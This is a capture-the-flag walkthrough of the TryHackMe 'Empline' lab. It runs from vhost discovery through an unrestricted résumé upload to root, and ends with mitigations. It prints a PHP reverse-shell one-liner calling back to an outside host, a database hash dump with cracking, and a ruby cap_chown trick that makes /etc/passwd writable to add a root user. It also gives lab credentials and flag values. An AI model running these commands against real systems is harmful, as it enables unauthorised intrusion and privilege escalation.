# Empline CTF Walkthrough

**Target:** Empline
**Source:** [TryHackMe](https://tryhackme.com/room/empline)
**Difficulty:** Medium
**Target IP:** 10.81.137.138

> **Note:** Add both `10.81.137.138 empline.thm` and
> `10.81.137.138 job.empline.thm` to `/etc/hosts` — the job portal lives on
> its own vhost discovered during enumeration, not in the initial scan.

## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Vhost Discovery via Page Source](#vhost-discovery-via-page-source)
- [Web Enumeration on the Job Portal](#web-enumeration-on-the-job-portal)
- [Unrestricted File Upload via Career Portal](#unrestricted-file-upload-via-career-portal)
- [Reverse Shell as www-data](#reverse-shell-as-www-data)
- [OpenCATS Source Review & Database Credentials](#opencats-source-review--database-credentials)
- [Database Dump & Hash Cracking](#database-dump--hash-cracking)
- [Lateral Movement to george](#lateral-movement-to-george)
- [User Flag](#user-flag)
- [Privilege Escalation via Ruby Capability Abuse](#privilege-escalation-via-ruby-capability-abuse)
- [Root Flag](#root-flag)
- [Flags](#flags)
- [Vulnerabilities](#vulnerabilities)
- [Attack Chain Summary](#attack-chain-summary)
- [Tools Used](#tools-used)
- [References](#references)

---

## Overview

Empline is a medium Linux box built around an OpenCATS applicant-tracking
deployment ("Empline" job board). The path runs through a hidden vhost
leaked in an HTML comment, an OpenCATS career-portal résumé upload with no
file-type restriction (used to drop a PHP reverse shell), a hardcoded
database password recovered from `config.php`, an MD5 hash dump cracked with
hashcat, password-reuse-driven lateral movement to a system account, and
finally a Linux capability (`cap_chown`) left on the `ruby` binary that is
abused to make `/etc/passwd` attacker-writable, letting a new root-equivalent
user be appended directly.

**Key Skills Required:**
- Network scanning and service enumeration
- Discovering hidden vhosts from page source
- Web directory brute forcing
- Unrestricted file upload → reverse shell
- PHP source code review for hardcoded credentials
- MySQL/MariaDB enumeration and MD5 hash cracking (hashcat)
- Password reuse / credential-based lateral movement (`su`)
- Linux capability abuse (`cap_chown` on `ruby`) to rewrite `/etc/passwd`

---

## Reconnaissance

### Network Scanning

A full-port service/version scan shows three open services:

```bash
nmap -sVC -O -p- 10.81.137.138
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | ssh | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 80/tcp | http | Apache httpd 2.4.29 (Ubuntu) — "Empline" |
| 3306/tcp | mysql | MariaDB 5.5.5-10.1.48 |

SSH, a web front end, and an exposed MariaDB service — the web app is the
entry point.

---

## Vhost Discovery via Page Source

The main page at `http://10.81.137.138/` looks like a static company site,
but its HTML source (line 53) leaks a second hostname:

```html
<li class="scroll-to-section">
  <a href="http://job.empline.thm/careers" class="menu-item">Employment</a>
```

Adding both hostnames to `/etc/hosts` reveals a separate application:

```
10.81.137.138   empline.thm   job.empline.thm
```

- `http://job.empline.thm/` → an **OpenCATS** login page
- `http://job.empline.thm/careers/` → a public job listing

> **Hidden vhost:** `job.empline.thm` (OpenCATS applicant tracking system)

---

## Web Enumeration on the Job Portal

Directory brute forcing the job portal vhost surfaces OpenCATS's internal
structure:

```bash
gobuster dir -u http://job.empline.thm/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 45
```

```
xml, modules, careers, scripts, upload, rss, ajax, test,
images, lib, src, db, js, javascript, temp, vendor,
attachments, ci, wsdl
```

`/db/` looks promising — a directory listing of OpenCATS's install SQL
files:

```bash
curl http://job.empline.thm/db/
```

```
cats_schema.sql
cats_testdata.bak
upgrade-0.5.0-0.5.1.sql
upgrade-0.5.1-0.5.2.sql
upgrade-0.5.2-0.5.5.sql
upgrade-0.5.5-0.6.x.sql
upgrade-0.6.x-0.7.0.sql
upgrade-zipcodes.sql
```

These turn out to be stock OpenCATS install files with no environment-
specific secrets — a rabbit hole. The real way in is through the
application itself.

---

## Unrestricted File Upload via Career Portal

The public job listing has a single posting ("Mobile Dev"):

```
http://job.empline.thm/careers/index.php?m=careers&p=showAll
http://job.empline.thm/careers/index.php?m=careers&p=showJob&ID=1
http://job.empline.thm/careers/index.php?m=careers&p=applyToJob&ID=1
```

The "Apply" form accepts a résumé upload. A plain text file is accepted and
served back without modification:

```bash
echo "Test file" > test.txt
# submit via the "Import resume" file picker and click Upload
```

```
http://job.empline.thm/upload/careerportaladd/test.txt  -> upload successful
```

Testing a PHP file confirms there is no file-type validation at all:

```bash
echo '<?php phpinfo() ?>' > test.php
```

```
http://job.empline.thm/upload/careerportaladd/test.php
PHP Version 5.6.40-52+ubuntu18.04.1+deb.sury.org+1
```

> **Vulnerability:** Unrestricted file upload in the OpenCATS career-portal
> résumé importer (`/upload/careerportaladd/`)

---

## Reverse Shell as www-data

A PHP one-liner reverse shell is uploaded the same way:

```bash
nano shell.php
```

```php
<?php system("/bin/bash -c 'bash -i >& /dev/tcp/192.168.131.60/9013 0>&1'"); ?>
```

Set up a listener first, then request the uploaded file:

```bash
rlwrap nc -nvlp 9013
```

```
listening on [any] 9013 ...
connect to [192.168.131.60] from (UNKNOWN) [10.81.137.138] 60408
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Stabilize the shell:

```bash
export TERM=xterm
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

> **Foothold:** `www-data` (via unrestricted file upload)

---

## OpenCATS Source Review & Database Credentials

The application root sits at `/var/www/opencats`. Its `config.php` holds the
database connection string in plaintext:

```bash
cat config.php
```

```php
define('DATABASE_USER', 'james');
define('DATABASE_PASS', 'ng6pUFvsGNtw');
define('DATABASE_HOST', 'localhost');
define('DATABASE_NAME', 'opencats');
```

> **Recovered credentials:** `james : ng6pUFvsGNtw` (MariaDB)

---

## Database Dump & Hash Cracking

Log into MariaDB with the recovered credentials and dump the OpenCATS
`user` table:

```bash
mysql -u james -p
show databases;
use opencats;
select user_id, user_name, password, access_level, session_cookie from user\G
```

```
user_name: admin    password: b67b5ecc5d8902ba59c65596e4c053ec   access_level: 500
user_name: george   password: 86d0dfda99dbebc424eb4407947356ac   access_level: 400
user_name: james    password: e53fbdb31890ff3bc129db0e27c473c9   access_level: 200
```

(The `cats@rootadmin` row has a literal non-hash placeholder, `cantlogin`,
and `access_level: 0` — not a usable credential.)

The three real hashes are unsalted MD5 and crackable with hashcat against
`rockyou.txt`:

```bash
echo "b67b5ecc5d8902ba59c65596e4c053ec
86d0dfda99dbebc424eb4407947356ac
e53fbdb31890ff3bc129db0e27c473c9" > hashes.txt

hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

```
86d0dfda99dbebc424eb4407947356ac:pretonnevippasempre
Recovered: 1/3 (33.33%) Digests
```

Only `george`'s hash cracks against the wordlist.

> **Recovered credentials:** `george : pretonnevippasempre`

---

## Lateral Movement to george

`/home` confirms `george` is a real system account, and the cracked
password is reused there:

```bash
ls /home
# george  ubuntu

su george
Password: pretonnevippasempre
```

> **Foothold:** `george`

---

## User Flag

```bash
george@empline:~$ cat user.txt
91cb89c70aa2e5ce0e0116dab099078e
```

> **User flag:** `91cb89c70aa2e5ce0e0116dab099078e`

---

## Privilege Escalation via Ruby Capability Abuse

`sudo -l` is a dead end — `george` has no sudo rights at all:

```bash
sudo -l
# Sorry, user george may not run sudo on empline.
```

SUID enumeration also turns up nothing unusual (`su`, `mount`, `ping`, etc.
— all standard). The real misconfiguration is a Linux file **capability**,
not a SUID bit:

```bash
whereis getcap
/sbin/getcap -r / 2>/dev/null
```

```
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/local/bin/ruby = cap_chown+ep
```

`ruby` carries `cap_chown`, meaning any script run with it can change file
ownership regardless of the calling user's actual privileges — per
[GTFOBins' `ruby` entry](https://gtfobins.org/gtfobins/ruby/#capabilities),
this is enough to take over `/etc/passwd`:

```bash
/usr/local/bin/ruby -e 'require "fileutils"; FileUtils.chown("george","george","/etc/passwd")'
```

With `/etc/passwd` now owned by `george`, a new root-equivalent user is
appended directly, using a locally generated password hash:

```bash
HASH=$(openssl passwd passwd13)
/usr/local/bin/ruby -e 'require "fileutils"; FileUtils.chown("george","george","/etc/passwd")' && \
echo "root2:${HASH}:0:0:root:/root:/bin/bash" >> /etc/passwd
```

Switch to the newly created account:

```bash
su root2
Password: passwd13
```

```
root@empline:/tmp# whoami
root
root@empline:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

> **Privilege escalation:** `george` → `cap_chown` on `ruby` →
> `chown /etc/passwd` to self → append a root-UID user entry → `su` as the
> new user → root

---

## Root Flag

```bash
root@empline:~# cat root.txt
74fea7cd0556e9c6f22e6f54bc68f5d5
```

> **Root flag:** `74fea7cd0556e9c6f22e6f54bc68f5d5`

---

## Flags

| Flag | Value | Location |
|------|-------|----------|
| User flag | `91cb89c70aa2e5ce0e0116dab099078e` | `/home/george/user.txt` |
| Root flag | `74fea7cd0556e9c6f22e6f54bc68f5d5` | `/root/root.txt` |

---

## Vulnerabilities

### 1. Hidden Vhost Disclosed in Page Source (Low)

**Description:** The public marketing site links to `job.empline.thm` in a
visible `<a href>`, exposing an internal applicant-tracking vhost that
isn't otherwise advertised or routed to by default DNS.

**Impact:** Discovery of the real attack surface (OpenCATS).

**Mitigation:**
- Don't rely on an unlisted hostname as access control.
- Review all links and comments in shipped HTML for internal references.

### 2. Unrestricted File Upload — OpenCATS Career Portal (Critical)

**Description:** The résumé upload feature at
`/upload/careerportaladd/` accepts any file type, including executable PHP,
and serves it back from a predictable, web-accessible path with no
content validation.

**Impact:** Remote code execution as `www-data` via an uploaded reverse
shell.

**Mitigation:**
- Validate uploads by content/MIME type, not extension.
- Store uploaded files outside the web root, or serve them with headers
  that prevent execution (e.g. `Content-Disposition: attachment`, a
  non-executable handler).
- Keep OpenCATS patched — this class of upload issue has public advisories
  for the product.

### 3. Hardcoded Database Credentials in Source (Medium)

**Description:** `config.php` stores the MariaDB username and password in
plaintext in a world-readable application file.

**Impact:** Full database access once code execution is achieved,
including all stored user password hashes.

**Mitigation:**
- Store credentials outside the web root in environment variables or a
  secrets manager.

### 4. Weak Password Hashing & Password Reuse (High)

**Description:** OpenCATS stored user passwords as unsalted MD5, and
`george`'s hash cracked quickly against `rockyou.txt`. The same plaintext
was reused for the matching Linux system account.

**Impact:** Lateral movement from the web application to a real shell
account.

**Mitigation:**
- Use a modern salted hashing algorithm (bcrypt/argon2) for stored
  credentials.
- Enforce unique passwords across application and system accounts.

### 5. Dangerous Linux Capability on `ruby` (Critical)

**Description:** `/usr/local/bin/ruby` was granted `cap_chown+ep`, letting
any user invoking it change ownership of arbitrary files — including
`/etc/passwd` — without needing root or `sudo` rights.

**Impact:** Full privilege escalation: a self-owned `/etc/passwd` can be
appended with a new UID-0 user and a known password.

**Mitigation:**
- Avoid assigning powerful capabilities (`cap_chown`, `cap_setuid`, etc.)
  to general-purpose interpreters.
- Periodically audit `getcap -r /` for unexpected capability grants.

---

## Attack Chain Summary

```
Nmap scan → SSH + HTTP + exposed MariaDB
    ↓
http://10.81.137.138/ → page source leaks job.empline.thm
    ↓
/etc/hosts → job.empline.thm → OpenCATS login + /careers/
    ↓
gobuster → /db/ (rabbit hole: stock SQL install files)
    ↓
careers apply form → résumé upload accepts .txt, then .php
    ↓
upload shell.php → nc listener → foothold: www-data
    ↓
/var/www/opencats/config.php → MariaDB creds (james:ng6pUFvsGNtw)
    ↓
mysql opencats.user → 3 MD5 hashes → hashcat cracks george's
    ↓
su george (password reuse) → User flag: 91cb89c70aa2e5ce0e0116dab099078e
    ↓
sudo -l: denied → SUID sweep: nothing → getcap -r /: ruby has cap_chown
    ↓
ruby cap_chown → chown /etc/passwd to george → append root2:UID0 entry
    ↓
su root2 → root
    ↓
Root flag: 74fea7cd0556e9c6f22e6f54bc68f5d5
    ↓
Complete system compromise
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service/OS detection |
| Gobuster | Web directory enumeration |
| curl | Fetching the `/db/` directory listing |
| PHP reverse shell (inline one-liner) | Initial code execution as `www-data` |
| netcat / rlwrap | Reverse shell listener |
| MySQL/MariaDB client | Database enumeration and credential/hash dump |
| hashcat | Cracking MD5 password hashes against `rockyou.txt` |
| getcap | Discovering the `cap_chown` capability on `ruby` |
| ruby + FileUtils | Abusing `cap_chown` to take ownership of `/etc/passwd` |
| openssl passwd | Generating a crypt-compatible password hash for the new user |
| su | Lateral movement and final privilege escalation |

---

## References

- [TryHackMe — Empline](https://tryhackme.com/room/empline)
- [Nmap](https://nmap.org/)
- [Gobuster](https://github.com/OJ/gobuster)
- [OpenCATS](https://www.opencats.org/)
- [hashcat](https://hashcat.net/hashcat/)
- [GTFOBins — ruby (capabilities)](https://gtfobins.org/gtfobins/ruby/#capabilities)

---
